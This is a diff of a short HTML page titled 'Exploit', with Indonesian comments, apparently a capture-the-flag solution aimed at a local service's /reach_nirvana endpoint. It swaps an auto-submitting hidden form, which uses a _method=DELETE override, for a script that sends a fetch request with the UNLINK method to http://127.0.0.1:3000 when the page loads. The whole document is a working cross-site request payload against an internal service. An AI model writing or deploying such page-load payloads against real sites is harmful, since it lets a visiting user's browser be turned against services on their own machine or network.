@@ -4,16 +4,11 @@
     <title>Exploit</title>
 </head>
 <body>
-    <!-- Form tersembunyi yang langsung menembak target internal -->
-    <form id="exploitForm" action="http://127.0.0.1:3000/reach_nirvana" method="POST">
-        <!-- Jika endpoint /reach_nirvana membutuhkan method DELETE via Express, 
-             beberapa aplikasi menggunakan method-override seperti parameter _method -->
-        <input type="hidden" name="_method" value="DELETE">
-    </form>
-
     <script>
-        // Form langsung dikirim seketika saat halaman dimuat
-        document.getElementById('exploitForm').submit();
+        // Mencoba menembak menggunakan rute metode UNLINK ke target internal
+        fetch('http://127.0.0.1:3000/reach_nirvana', {
+            method: 'UNLINK'
+        }).catch(err => console.log(err));
     </script>
 </body>
 </html>
